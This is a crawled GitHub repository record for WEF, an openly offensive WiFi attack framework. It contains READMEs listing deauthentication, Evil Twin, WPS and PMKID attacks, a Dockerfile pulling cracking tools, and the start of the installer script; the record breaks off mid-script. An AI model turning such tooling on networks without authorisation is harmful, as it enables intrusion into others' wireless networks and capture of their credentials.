{
  "metadata": {
    "timestamp": 1736568325614,
    "page": 250,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjI1MA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "D3Ext/WEF",
      "stars": 2447,
      "defaultBranch": "main",
      "files": [
        {
          "name": ".github",
          "type": "tree",
          "content": null
        },
        {
          "name": ".gitignore",
          "type": "blob",
          "size": 0.0078125,
          "content": "main/*\n\n"
        },
        {
          "name": "CHANGELOG.md",
          "type": "blob",
          "size": 5.9423828125,
          "content": "- new update: pwnagotchi mode, more languages supported for EvilTwin portals, bugs fixed and more\n- some necessary changes to prevent errors on PMKID attack, and extra little changes\n- little changes\n- new version (a lot of big changes)\n- important fix\n- importan fix and more little changes\n- error fixes and little changes on setup.sh\n- setup.sh hot fix\n- General improvement, new attack (WIDS Confusion), EvilTwin attack rework, more functions, better output logging, bug fixes, explanations added to repo's Wiki, code optimization and much more\n- Merge pull request #31 from v1nc/patch-1\n- Add installation of reaver to setup for on arch\n- Little changes\n- Create FUNDING.yml\n- bug issue template added\n- some minor changes\n- code tabulation fixed\n- Update README.md\n- code optimization, fixes, general improvements\n- Merge pull request #29 from tomdot-dev/main\n- Fix inhibit typo\n- Merge pull request #28 from tomdot-dev/fix-typo-setup\n- Fix typo in setup.sh\n- Update README.md\n- Merge pull request #25 from iArmanKarimi/main\n- Merge pull request #2 from iArmanKarimi/md\n- fix grammar\n- Merge pull request #1 from iArmanKarimi/md\n- Fix all markdown violations\n- typo\n- Update README.md\n- Update setup.sh\n- Update README.md\n- Update README.md\n- Update README.md\n- Update WEF\n- Update README.md\n- Update setup.sh\n- Update README.md\n- Update WEF\n- Merge pull request #17 from ultrazar/main\n- Merge branch 'main' of https://github.com/ultrazar/WEF\n- bug fix\n- Improvements and bugs fixes\n- Merge pull request #16 from ultrazar/main\n- improvements\n- Update setup.sh\n- Update uninstaller.sh\n- Update clear.sh\n- Update WEF\n- Update WEF\n- Update setup.sh\n- Update README.md\n- Merge pull request #15 from ultrazar/main\n- .\n- updates to setup.sh and moving files\n- Update setup.sh\n- Add files via upload\n- Update setup.sh\n- Add files via upload\n- Delete WEF.png\n- Update README.md\n- Update README.md\n- Add files via upload\n- Add files via upload\n- Delete WEF.png\n- Add files via upload\n- Update README.md\n- Add files via upload\n- Update .gitignore\n- Add files via upload\n- Add files via upload\n- Update version.txt\n- Update WEF\n- Update setup.sh\n- Update README.md\n- Merge pull request #4 from TLC-10/main\n- Update README.md\n- Add files via upload\n- Delete update.sh\n- Update README.md\n- Update WEF\n- Update WEF\n- Update README.md\n- Update README.md\n- Update .wef.config\n- Add files via upload\n- Delete wef\n- Add files via upload\n- Add files via upload\n- Add files via upload\n- Update README.md\n- Add files via upload\n- Update setup.sh\n- Add files via upload\n- Update setup.sh\n- Update setup.sh\n- Update setup.sh\n- Update setup.sh\n- Create .wef.config\n- Update setup.sh\n- Update setup.sh\n- Update uninstaller.sh\n- Update setup.sh\n- Merge pull request #2 from ultrazar/main\n- last changes\n- .\n- new setup.sh\n- Add files via upload\n- Fixed Arch Linux problems and some updates\n- Update WEF\n- Update README.md\n- Add files via upload\n- Delete WEF\n- Update README.md\n- Update README.md\n- Update README.md\n- Add files via upload\n- Merge pull request #1 from ultrazar/patch-1\n- Update WEF\n- Solution for monitor mode check\n- Add files via upload\n- Delete WEF\n- Update setup.sh\n- Add files via upload\n- Delete WEF\n- Update README.md\n- Add files via upload\n- Delete WEF\n- Update README.md\n- Update setup.sh\n- Update setup.sh\n- Update README.md\n- Add files via upload\n- Delete banner.png\n- Update README.md\n- Add files via upload\n- Delete WEF\n- Update setup.sh\n- Create update.sh\n- Create version.txt\n- Update README.md\n- Update README.md\n- Update setup.sh\n- Update setup.sh\n- Update setup.sh\n- Add files via upload\n- Delete WEF\n- Update README.md\n- Add files via upload\n- Delete WEF\n- Update README.md\n- Update uninstaller.sh\n- Add files via upload\n- Update setup.sh\n- Update setup.sh\n- Delete wef-demo.png\n- Update README.md\n- Add files via upload\n- Delete WEF\n- Update README.md\n- Update setup.sh\n- Update README.md\n- Update setup.sh\n- Add files via upload\n- Delete WEF\n- Create LICENSE\n- Delete LICENSE\n- Update README.md\n- Update setup.sh\n- Update clear.sh\n- Delete versions directory\n- Add files via upload\n- Add files via upload\n- Add files via upload\n- Add files via upload\n- Delete WEF\n- Add files via upload\n- Delete WEF\n- Add files via upload\n- Delete WEF\n- Update clear.sh\n- Update clear.sh\n- Add files via upload\n- Delete WEF\n- Update clear.sh\n- Update setup.sh\n- Add files via upload\n- Delete WEF\n- Update README.md\n- Create requirements.txt\n- Update README.md\n- Update setup.sh\n- Add files via upload\n- Add files via upload\n- Update README.md\n- Update README.md\n- Delete temp\n- Add files via upload\n- Create temp\n- Delete wef\n- Create wef\n- Update setup.sh\n- Add files via upload\n- Delete WEF\n- Update clear.sh\n- Update setup.sh\n- Update setup.sh\n- Update README.md\n- Delete skull5.jpg\n- Delete skull2.jpg\n- Delete skull.png\n- Update README.md\n- Add files via upload\n- Delete skull.png\n- Update README.md\n- Update README.md\n- Add files via upload\n- Delete anti-wifi.png\n- Add files via upload\n- Update WEF\n- Update WEF\n- Update WEF\n- Update README.md\n- Update README.md\n- Update README.md\n- Add files via upload\n- Delete setup.sh\n- Update setup.sh\n- Update README.md\n- Add files via upload\n- Add files via upload\n- Delete WEF-1-8.sh\n- Update setup.sh\n- Update clear.sh\n- Update README.md\n- Add files via upload\n- Update WEF-1-7.sh\n- Update WEF-1-7.sh\n- Update WEF-1-7.sh\n- Update README.md\n- Add files via upload\n- Update README.md\n- Update README.md\n- Update README.md\n- Update README.md\n- Update README.md\n- Update WEF-1-7.sh\n- Add files via upload\n- Update clear.sh\n- Update clear.sh\n- Update setup.sh\n- Add files via upload\n- Update setup.sh\n- Create clear.sh\n- Add files via upload\n- Add files via upload\n- Update README.md\n- Update README.md\n- Update README.md\n- Update README.md\n- Update README.md\n- Update setup.sh\n- Create setup.sh\n- Delete WEF.sh\n- Add files via upload\n- Add files via upload\n- Update README.md\n- Delete test2\n- Add files via upload\n- Create test2\n- Delete test\n- Update README.md\n- Add files via upload\n- Create test\n- Add files via upload\n- Initial commit\n"
        },
        {
          "name": "CODE_OF_CONDUCT.md",
          "type": "blob",
          "size": 3.150390625,
          "content": "# Contributor Covenant Code of Conduct\n\n## Our Pledge\n\nIn the interest of fostering an open and welcoming environment, we as\ncontributors and maintainers pledge to making participation in our project and\nour community a harassment-free experience for everyone, regardless of age, body\nsize, disability, ethnicity, gender identity and expression, level of experience,\neducation, socio-economic status, nationality, personal appearance, race,\nreligion, or sexual identity and orientation.\n\n## Our Standards\n\nExamples of behavior that contributes to creating a positive environment\ninclude:\n\n* Using welcoming and inclusive language\n* Being respectful of differing viewpoints and experiences\n* Gracefully accepting constructive criticism\n* Focusing on what is best for the community\n* Showing empathy towards other community members\n\nExamples of unacceptable behavior by participants include:\n\n* The use of sexualized language or imagery and unwelcome sexual attention or\n  advances\n* Trolling, insulting/derogatory comments, and personal or political attacks\n* Public or private harassment\n* Publishing others' private information, such as a physical or electronic\n  address, without explicit permission\n* Other conduct which could reasonably be considered inappropriate in a\n  professional setting\n\n## Our Responsibilities\n\nProject maintainers are responsible for clarifying the standards of acceptable\nbehavior and are expected to take appropriate and fair corrective action in\nresponse to any instances of unacceptable behavior.\n\nProject maintainers have the right and responsibility to remove, edit, or\nreject comments, commits, code, wiki edits, issues, and other contributions\nthat are not aligned to this Code of Conduct, or to ban temporarily or\npermanently any contributor for other behaviors that they deem inappropriate,\nthreatening, offensive, or harmful.\n\n## Scope\n\nThis Code of Conduct applies both within project spaces and in public spaces\nwhen an individual is representing the project or its community. Examples of\nrepresenting a project or community include using an official project e-mail\naddress, posting via an official social media account, or acting as an appointed\nrepresentative at an online or offline event. Representation of a project may be\nfurther defined and clarified by project maintainers.\n\n## Enforcement\n\nInstances of abusive, harassing, or otherwise unacceptable behavior may be\nreported by contacting the project team at [d3ext@proton.me]. All\ncomplaints will be reviewed and investigated and will result in a response that\nis deemed necessary and appropriate to the circumstances. The project team is\nobligated to maintain confidentiality with regard to the reporter of an incident.\nFurther details of specific enforcement policies may be posted separately.\n\nProject maintainers who do not follow or enforce the Code of Conduct in good\nfaith may face temporary or permanent repercussions as determined by other\nmembers of the project's leadership.\n\n## Attribution\n\nThis Code of Conduct is adapted from the [Contributor Covenant][homepage], version 1.4,\navailable at https://www.contributor-covenant.org/version/1/4/code-of-conduct.html\n\n[homepage]: https://www.contributor-covenant.org\n\n"
        },
        {
          "name": "CONTRIBUTING.md",
          "type": "blob",
          "size": 1.1689453125,
          "content": "# Contributing to WEF\n\nContributions are welcomed! This document provides some basic guidelines for contributors.\n\n## Found a bug?\n\n- Before creating a Pull Request (PR), make sure there is a corresponding issue for your contribution. If there isn't one already, please create one.\n- Include the problem description in the issue.\n\n## Pull Requests\n\nWhen creating a PR, please follow these guidelines:\n\n- Link your PR to the corresponding issue.\n- Provide context in the PR description to help reviewers understand the changes. The more information you provide, the faster the review process will be.\n- Include an example of running the tool with the changed code, if applicable. Provide 'before' and 'after' examples if possible.\n- Include steps for functional testing or replication.\n\n## Questions\n\nIf you have any questions or need further guidance, please feel free to ask in the issue or PR, or reach out to the author via Discord: ***@d3ext***\n\nThank you for your contribution!\n\n## License\n\nBy contributing your code, you agree to license your contribution under the terms of the [MIT License](https://github.com/D3Ext/WEF/blob/main/LICENSE).\n\nAll files are released with the MIT license.\n\n\n\n"
        },
        {
          "name": "Dockerfile",
          "type": "blob",
          "size": 0.5400390625,
          "content": "FROM kalilinux/kali-rolling:latest\n\n# update packages and install main requirements\nRUN apt-get update && apt-get install -y iproute2 iw macchanger aircrack-ng mdk4 xterm awk sed jq pciutils bsdmainutils curl procps john hashcat hcxtools hcxdumptool reaver pixiewps hostapd hostapd-wpe dnsmasq lighttpd bettercap\n\n# set work directory\nWORKDIR /app\n\n# clone WEF repository\nRUN git clone https://github.com/D3Ext/WEF\n\n# change working directory to repository path\nWORKDIR /app/WEF\n\n# execute installer to install WEF\nRUN bash wef\n\nWORKDIR /usr/share/wef\n\n"
        },
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 1.037109375,
          "content": "MIT License\n\nCopyright (c) 2024 D3Ext\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 5.5654296875,
          "content": "<p align=\"center\">\n  <h1 align=\"center\">WEF</h1>\n  <h4 align=\"center\">WiFi Exploitation Framework</h4>\n  <h6 align=\"center\">Coded with 💙 by D3Ext</h6>\n</p>\n\n<p align=\"center\">\n\n  <a href=\"https://opensource.org/licenses/MIT\">\n    <img src=\"https://img.shields.io/badge/license-MIT-_red.svg\">\n  </a>\n\n  <a href=\"https://github.com/D3Ext/D3Ext/blob/main/CHANGELOG.md\">\n    <img src=\"https://img.shields.io/badge/maintained%3F-yes-brightgreen.svg\">\n  </a>\n\n  <a href=\"https://github.com/D3Ext/WEF/issues\">\n    <img src=\"https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat\">\n  </a>\n\n</p>\n\n<p align=\"center\">\n  <a href=\"#introduction\">Introduction</a> •\n  <a href=\"#attacks\">Attacks</a> •\n  <a href=\"#features\">Features</a> •\n  <a href=\"#installation\">Installation</a> •\n  <a href=\"#requirements\">Requirements</a>\n</p></br>\n\n<p align=\"center\">\n  <a href=\"SPANISH.md\">Readme in spanish</a>\n</p>\n\n---\n\n<div align=\"center\">\n  <img src=\"images/wef.webp\" alt=\"WEF\" width=23% height=50%>\n</div>\n\n## Introduction\n\nThis project started over 2021 as a personal tool to easily audit networks without writing long commands or setting all values one by one, in order to automate the whole processes. This is not a professional tool, this project was created to learn about wireless security and for testing purposes. This is a fully offensive framework to audit wifi networks with different types of attacks for WPA/WPA2, WPS and WEP, automated handshake cracking and much more.\n\nIf you find an error, please open an issue (you can write it in english or spanish, as you want). If you have any doubt contact me via Discord, my username is ***d3ext***\n\n## Attacks\n\n- Deauthentication attack\n- WIDS Confusion attack\n- Authentication attack\n- Beacon Flood attack\n- TKIP attack (Michael Shutdown Exploitation)\n- Pixie Dust attack\n- Null Pin attack\n- PIN Bruteforce attack\n- ARP Replay attack\n- HIRTE attack\n- Caffe Latte attack\n- Fake Authentication attack\n- WPA/WPA2 handshake capture attack (passively)\n- PMKID attack\n- Evil Twin attack\n\nThis attacks are explained [here](https://github.com/D3Ext/WEF/wiki/Attacks) on the Wiki\n\n## Features\n\n:ballot_box_with_check: WPA/WPA2, WPS and WEP Attacks\n\n:ballot_box_with_check: Automatic handshake capture and cracking\n\n:ballot_box_with_check: Multiple templates for EvilTwin attack (different languages)\n\n:ballot_box_with_check: Enable/disable monitor mode and view interface info (frequencies, chipset, MAC...)\n\n:ballot_box_with_check: 2.4 GHz and 5 GHz supported\n\n:ballot_box_with_check: Informative attack logs (just done user side)\n\n:ballot_box_with_check: Custom wordlist selector when cracking handshakes\n\n:ballot_box_with_check: English and spanish supported\n\nAnd much more\n\n## Installation\n\n> As root\n```sh\ngit clone https://github.com/D3Ext/WEF\ncd WEF\nbash wef\n```\n\nTake a look at the [Wiki](https://github.com/D3Ext/WEF/wiki/Installation) where I have more info about the installation\n\n## Uninstallation\n\nSimply execute this:\n\n```sh\nrm -rf /usr/share/wef \\\n  /usr/bin/wef\n```\n\n## Usage\n\n> Common usage of the framework\n```sh\nwef -i wlan0 # Your interface name might be different\n```\n\n> Help panel\n```\n __      _____ ___\n \\ \\    / / __| __|\n  \\ \\/\\/ /| _|| _|\n   \\_/\\_/ |___|_|\n\n[WEF] WiFi Exploitation Framework 1.4\n\n[*] Interfaces:\n    wlan0\n    ens33\n\nRequired parameters:\n    -i, --interface)    The name of your network adapter interface in managed mode\n\nOptional parameters:\n    -h, --help)         Show this help panel\n    --version)          Print the version and exit\n```\n\nSee [here](https://github.com/D3Ext/WEF/wiki/Usage-&-Tips) for more information about how to use the tool and other related topics\n\n## Demo\n\n<img src=\"https://raw.githubusercontent.com/D3Ext/WEF/main/images/wef-demo.png\">\n\n<img src=\"https://raw.githubusercontent.com/D3Ext/WEF/main/images/wef-demo2.png\">\n\n<img src=\"https://raw.githubusercontent.com/D3Ext/WEF/main/images/wef-demo3.png\">\n\n<img src=\"https://raw.githubusercontent.com/D3Ext/WEF/main/images/help-panel.png\">\n\n<img src=\"https://raw.githubusercontent.com/D3Ext/WEF/main/images/randomize-mac.png\">\n\n<img src=\"https://raw.githubusercontent.com/D3Ext/WEF/main/images/info.png\">\n\n## TODO\n\n- ~~Pwnagotchi mode~~\n- Add vendor logo to EvilTwin templates on the fly\n- Test compatibility with others OS\n- ~~KARMA attack~~\n- In-depth testing of implemented features\n- ~~More general improvement~~\n- ~~More languages added to Evil Twin templates~~\n\n## Contributing\n\nSee [CONTRIBUTING.md](https://github.com/D3Ext/WEF/blob/main/CONTRIBUTING.md)\n\n## Changelog\n\nSee [CHANGELOG.md](https://github.com/D3Ext/WEF/blob/main/CHANGELOG.md)\n\n## Credits\n\nThanks to [ultrazar](https://github.com/ultrazar) and [ErKbModifier](https://github.com/ErKbModifier), they helped me a lot <3\n\n## References\n\n```\nhttps://github.com/aircrack-ng/aircrack-ng\nhttps://github.com/aircrack-ng/mdk4\nhttps://github.com/v1s1t0r1sh3r3/airgeddon\nhttps://github.com/FluxionNetwork/fluxion\nhttps://github.com/P0cL4bs/wifipumpkin3\nhttps://github.com/s0lst1c3/eaphammer\nhttps://github.com/derv82/wifite2\nhttps://github.com/wifiphisher/wifiphisher\nhttps://github.com/ZerBea/hcxtools\nhttps://github.com/ZerBea/hcxdumptool\nhttps://github.com/Tylous/SniffAir\nhttps://github.com/evilsocket/pwnagotchi\nhttps://github.com/koutto/pi-pwnbox-rogueap\nhttps://github.com/koutto/pi-pwnbox-rogueap/wiki/01.-WiFi-Basics\n```\n\n## Disclaimer\n\nCreator has no responsibility for any kind of:\n\n- Illegal use of the project.\n- Law infringement by third parties and users.\n- Malicious act, capable of causing damage to third parties, promoted by the user through this software.\n\n## License\n\nThis project is under MIT license\n\nCopyright © 2024, *D3Ext*\n\n\n\n"
        },
        {
          "name": "SPANISH.md",
          "type": "blob",
          "size": 5.7041015625,
          "content": "<p align=\"center\">\n  <h1 align=\"center\">WEF</h1>\n  <h4 align=\"center\">WiFi Exploitation Framework</h4>\n  <h6 align=\"center\">Hecho con 💙 por D3Ext</h6>\n</p>\n\n<p align=\"center\">\n\n  <a href=\"https://opensource.org/licenses/MIT\">\n    <img src=\"https://img.shields.io/badge/license-MIT-_red.svg\">\n  </a>\n\n  <a href=\"https://github.com/D3Ext/D3Ext/blob/main/CHANGELOG.md\">\n    <img src=\"https://img.shields.io/badge/maintained%3F-yes-brightgreen.svg\">\n  </a>\n\n  <a href=\"https://github.com/D3Ext/WEF/issues\">\n    <img src=\"https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat\">\n  </a>\n\n</p>\n\n<p align=\"center\">\n  <a href=\"#introduccion\">Introducción</a> •\n  <a href=\"#ataques\">Ataques</a> •\n  <a href=\"#funciones\">Funciones</a> •\n  <a href=\"#instalación\">Instalación</a> •\n  <a href=\"#requisitos\">Requisitos</a>\n</p>\n\n<div align=\"center\">\n  <img src=\"images/wef.webp\" alt=\"WEF\" width=23% height=50%>\n</div>\n\n## Introducción\n\nEste proyecto comenzó alrededor de 2021 como una herramienta personal para auditar redes fácilmente sin escribir comandos largos, ni configurar todos los valores uno a uno además de automatizar todo el proceso. Esta no es una herramienta profesional, este proyecto fue creado para aprender acerca de la seguridad wireless. Esto un framework ofensivo para auditar redes wifi con diferentes tipos de ataques WPA/WPA2, WPS y WEP, cracking de hashes automatizado y mucho más.\n\nSi encuentras algún error, abre un issue en el repositorio (puedes escribirlo en español o inglés, como prefieras). Si tienes alguna duda también puedes contactar conmigo por Discord, mi usuario es ***d3ext***\n\n## Ataques\n\n- Ataque de deautenticación\n- Ataque de confusión WIDS\n- Ataque de autenticación\n- Ataque Beacon Flood\n- Ataque TKIP (Michael Shutdown Exploitation)\n- Ataque Pixie Dust\n- Ataque de pin nulo \n- Ataque de fuerza bruta de PIN\n- Ataque ARP Replay\n- Ataque HIRTE\n- Ataque Caffe Latte\n- Ataque de falsa autenticación\n- Ataque de captura de handshake WPA/WPA2 (de forma pasiva)\n- Ataque PMKID\n- Ataque Evil Twin\n\nLos diferentes ataques están explicados [aquí](https://github.com/D3Ext/WEF/wiki/Attacks) en la Wiki del repositorio\n\n## Funciones\n\n:ballot_box_with_check: Ataques WPA/WPA2, WPS y WEP\n\n:ballot_box_with_check: Captura y crackeo automático de handshakes\n\n:ballot_box_with_check: Multiples plantillas para el ataque EvilTwin (en diferentes idiomas)\n\n:ballot_box_with_check: Activar/desactivar el modo monitor y randomizar la dirección MAC\n\n:ballot_box_with_check: 2.4 GHz y 5 GHz soportados\n\n:ballot_box_with_check: Logs informativos sobre los ataques (solo se registra del lado del usuario)\n\n:ballot_box_with_check: Diccionarios personalizados al crackear handshakes\n\n:ballot_box_with_check: Inglés y español soportados\n\nY mucho más\n\n## Instalación\n\n> Como root\n```sh\ngit clone https://github.com/D3Ext/WEF\ncd WEF\nbash wef\n```\n\nEcha un ojo a la [Wiki](https://github.com/D3Ext/WEF/wiki/Installation) donde hay más información sobre la instalación\n\n## Desinstalación\n\n```sh\nrm -rf /usr/share/wef \\\n  /usr/bin/wef\n```\n\n## Uso\n\n> Uso habitual del framework\n```sh\nwef -i wlan0 # El nombre de la interfaz puede ser diferente\n```\n\n> Panel de ayuda\n```\n __      _____ ___\n \\ \\    / / __| __|\n  \\ \\/\\/ /| _|| _|\n   \\_/\\_/ |___|_|\n\n[WEF] WiFi Exploitation Framework 1.4\n\n[*] Interfaces:\n    wlan0\n    ens33\n\nRequired parameters:\n    -i, --interface)    The name of your network adapter interface in managed mode\n\nOptional parameters:\n    -h, --help)         Show this help panel\n    --version)          Print the version and exit\n```\n\nMira [aquí](https://github.com/D3Ext/WEF/wiki/Usage-&-Tips) para más información sobre como usar la herramienta y otros temas relacionados\n\n## Demo\n\n<img src=\"https://raw.githubusercontent.com/D3Ext/WEF/main/images/wef-demo.png\">\n\n<img src=\"https://raw.githubusercontent.com/D3Ext/WEF/main/images/wef-demo2.png\">\n\n<img src=\"https://raw.githubusercontent.com/D3Ext/WEF/main/images/wef-demo3.png\">\n\n<img src=\"https://raw.githubusercontent.com/D3Ext/WEF/main/images/help-panel.png\">\n\n<img src=\"https://raw.githubusercontent.com/D3Ext/WEF/main/images/randomize-mac.png\">\n\n<img src=\"https://raw.githubusercontent.com/D3Ext/WEF/main/images/info.png\">\n\n## TODO\n\n- ~~Modo Pwnagotchi~~\n- Añadir logo a las plantillas del ataque EvilTwin automaticamente basado en el vendor\n- Comprobar la compatibilidad con otros OS\n- ~~Ataque KARMA~~\n- Probar en profundidad las funcionalidades implementadas\n- ~~Más mejoras generales~~\n- ~~Más lenguajes añadidos a las plantillas de Evil Twin~~\n\n## Contribuir\n\nMira [CONTRIBUTING.md](https://github.com/D3Ext/WEF/blob/main/CONTRIBUTING.md)\n\n## Changelog\n\nMira [CHANGELOG.md](https://github.com/D3Ext/WEF/blob/main/CHANGELOG.md)\n\n## Creditos\n\nGracias a [ultrazar](https://github.com/ultrazar) y a [ErKbModifier](https://github.com/ErKbModifier) por ayudarme con la herramienta <3\n\n## Referencias\n\n```\nhttps://github.com/aircrack-ng/aircrack-ng\nhttps://github.com/aircrack-ng/mdk4\nhttps://github.com/v1s1t0r1sh3r3/airgeddon\nhttps://github.com/FluxionNetwork/fluxion\nhttps://github.com/P0cL4bs/wifipumpkin3\nhttps://github.com/s0lst1c3/eaphammer\nhttps://github.com/derv82/wifite2\nhttps://github.com/wifiphisher/wifiphisher\nhttps://github.com/ZerBea/hcxtools\nhttps://github.com/ZerBea/hcxdumptool\nhttps://github.com/Tylous/SniffAir\nhttps://github.com/evilsocket/pwnagotchi\nhttps://github.com/koutto/pi-pwnbox-rogueap\nhttps://github.com/koutto/pi-pwnbox-rogueap/wiki/01.-WiFi-Basics\n```\n\n## Disclaimer\n\nEl creador no se hace cargo de:\n\n- Uso ilegal del proyecto.\n- Infracción legal por parte de terceros y usuarios.\n- Acto maliciosos, capaz de causar daños a terceros, promovido por el usuario a través de este software.\n\n## Licencia\n\nEste proyecto está bajo licencia MIT\n\nCopyright © 2024, *D3Ext*\n\n"
        },
        {
          "name": "captive-portals",
          "type": "tree",
          "content": null
        },
        {
          "name": "example.cnf",
          "type": "blob",
          "size": 0.94140625,
          "content": "# This is default config file\n# This file must be saved as /usr/share/wef/wef.cnf\n# Then you can edit it to make it much more flexible and to adapt to your requirements\n\n# Default lenguage to use. Values: en, es\nlang=en\n\n# Colorize output (recommended to be enabled)\nuse_colors=true\n\n# Enable/disable verbose by default (recommended to be enabled)\nverbose=true\n\n# Automatically enable monitor mode during launch\nauto_enable_monitor=false\n\n# Wifi band in which to scan access points. Values: 2.4, 5, auto\nfrequency_band=auto\n\n# Scan nearby access points each time you decide to perform an attack\nscan_on_each_attack=true\n\n# Identify vendor of each nearby device found, based on a database (i.e. TP-LINK)\nidentify_devices=false\n\n# Execute 'airmon check kill' when you enable monitor mode (disable it on headless device)\nairmon_check_kill=true\n\n# Create a graph of every single scan you perform using airgraph-ng to see target devices and AP info\ncreate_graph=false\n\n"
        },
        {
          "name": "images",
          "type": "tree",
          "content": null
        },
        {
          "name": "index.html",
          "type": "blob",
          "size": 0.068359375,
          "content": "<center>\n  <img src=\"images/wef.webp\" width=23% height=50%>\n</center>\n"
        },
        {
          "name": "lib",
          "type": "tree",
          "content": null
        },
        {
          "name": "scripts",
          "type": "tree",
          "content": null
        },
        {
          "name": "src",
          "type": "tree",
          "content": null
        },
        {
          "name": "wef",
          "type": "blob",
          "size": 188.2763671875,
          "content": "#!/bin/bash\n\n#\n# WEF - WiFi Exploitation Framework\n# Discord: @d3ext\n# Website: https://d3ext.github.io/\n# Mail: <d3ext@proton.me>\n# Github: https://github.com/D3Ext\n#\n\n# Check dependencies to work with the least possible tools\nfunction check_dependencies(){\n  echo\n  if [ \"$lang\" == \"en\" ]; then\n    color_output_no_line \"*\" \"Checking installed tools and requirements...\"\n  else\n    color_output_no_line \"*\" \"Comprobando herramientas instaladas y requisitos...\"\n  fi; echo; sleep 0.2\n\n  main_tools=(ip iw macchanger aircrack-ng airmon-ng aireplay-ng airodump-ng mdk4 xterm awk sed jq lspci column curl ps)\n  for program in \"${main_tools[@]}\"; do\n    if [ ! \"$(command -v $program)\" ]; then\n      tools_missing=\"true\"\n\n      if [ \"$x\" != \"true\" ]; then\n        echo\n        x=\"true\"\n      fi\n\n      if [ \"$lang\" == \"en\" ]; then\n        echo -e \"${yC}${program}${blueC} not installed${endC}\"\n      else\n        echo -e \"${yC}${program}${blueC} no instalado${endC}\"\n      fi; sleep 0.05\n    fi\n  done\n\n  if [ \"$tools_missing\" == \"true\" ]; then\n    echo\n    if [ \"$lang\" == \"en\" ]; then\n      color_output \"*\" \"Install necessary requirements before using this tool\"\n    else\n      color_output \"*\" \"Instala los requisitos necesarios antes de usar esta herramienta\"\n    fi\n\n    exit 0\n  else\n    sleep 0.5\n  fi\n}\n\nfunction run_setup(){\n  color_output \"*\" \"Installing wef...\"\n  sleep 0.2\n\n  mkdir /usr/share/wef \\\n  /usr/share/wef/cache \\\n  /usr/share/wef/main \\\n  /usr/share/wef/main/captures \\\n  /usr/share/wef/main/logs \\\n  /usr/share/wef/main/graphs \\\n  /usr/share/wef/main/pwnagotchi 2>/dev/null\n  sleep 0.1\n\n  # Download captive portals if they are not already on current directory\n  if [ -d \".git\" ] && [ -d \"captive-portals\" ]; then\n    cp -r captive-portals/ /usr/share/wef/main/ 2>/dev/null\n  elif [ ! -d \"captive-portals\" ]; then\n    curl -LJO https://github.com/D3Ext/WEF/archive/main.zip &>/dev/null\n    unzip WEF-main.zip &>/dev/null\n    rm WEF-main.zip 2>/dev/null\n    downloaded=\"true\"\n\n    cp -r WEF-main/captive-portals/ /usr/share/wef/main/ 2>/dev/null\n  fi\n\n  sleep 0.1\n\n  # Download wordlists if they are not already on current directory\n  if [ -d \".git\" ] && [ -d \"wordlists\" ]; then\n    cp -r wordlists/ /usr/share/wef/main/ 2>/dev/null\n    gunzip /usr/share/wef/main/wordlists/rockyou.txt.gz 2>/dev/null\n  elif [ ! -d \"wordlists\" ]; then\n    if [ \"$downloaded\" != \"true\" ]; then\n      curl -LJO https://github.com/D3Ext/WEF/archive/main.zip &>/dev/null\n      unzip WEF-main.zip &>/dev/null\n      rm WEF-main.zip 2>/dev/null\n      downloaded=\"true\"\n    fi\n\n    cp -r WEF-main/wordlists/ /usr/share/wef/main/ 2>/dev/null\n    gunzip /usr/share/wef/main/wordlists/rockyou.txt.gz 2>/dev/null\n  fi\n\n  sleep 0.1\n\n  if [ -d \".git\" ] && [ -f \"wef\" ]; then\n    cp wef /usr/share/wef/wef\n    cp src/vendors.json /usr/share/wef/vendors.json 2>/dev/null\n  elif [ ! -f \"wef\" ]; then\n    if [ \"$downloaded\" != \"true\" ]; then\n      curl -LJO https://github.com/D3Ext/WEF/archive/main.zip &>/dev/null\n      unzip WEF-main.zip &>/dev/null\n      rm WEF-main.zip 2>/dev/null\n      downloaded=\"true\"\n    fi\n    \n    cp WEF-main/wef /usr/share/wef/wef 2>/dev/null\n    cp WEF-main/vendors.json /usr/share/wef/vendors.json 2>/dev/null\n  fi\n\n  sleep 0.1\n\n  ln -s /usr/share/wef/wef /usr/bin/wef 2>/dev/null\n  chmod +x /usr/share/wef/wef /usr/bin/wef 2>/dev/null  \n\n  if [ \"$downloaded\" == \"true\" ]; then\n    rm -rf WEF-main 2>/dev/null\n  fi\n\n  # Check if the wef config file exists in /usr/share/wef/\n  if [ ! -f \"/usr/share/wef/wef.cnf\" ]; then\n    echo -e \"${blueC}[${yC}*${blueC}] Creating config file /usr/share/wef/wef.cnf${endC}\"\n\n    echo \"# This is default config file\n# This file must be saved as /usr/share/wef/wef.cnf\n# Then you can edit it to make it much more flexible and to adapt to your requirements\n\n# Default lenguage to use. Values: en, es\nlang=en\n\n# Colorize output (recommended to be enabled)\nuse_colors=true\n\n# Enable/disable verbose by default (recommended to be enabled)\nverbose=true\" >> /usr/share/wef/wef.cnf\n  fi\n\n  color_output_ln \"*\" \"WEF successfully installed on path, execute ${yC}wef${endC}\"\n}\n\nfunction run_update(){\n  rm /usr/bin/wef /usr/share/wef/wef 2>/dev/null\n\n  run_setup &>/dev/null\n}\n\nfunction parse_config(){\n  verbose=$(awk -F \"=\" '/verbose/ {print $2}' /usr/share/wef/wef.cnf | sed 's/#.*//' | tr -d \" \" | sed '/^$/d')\n  frequency_band=$(awk -F \"=\" 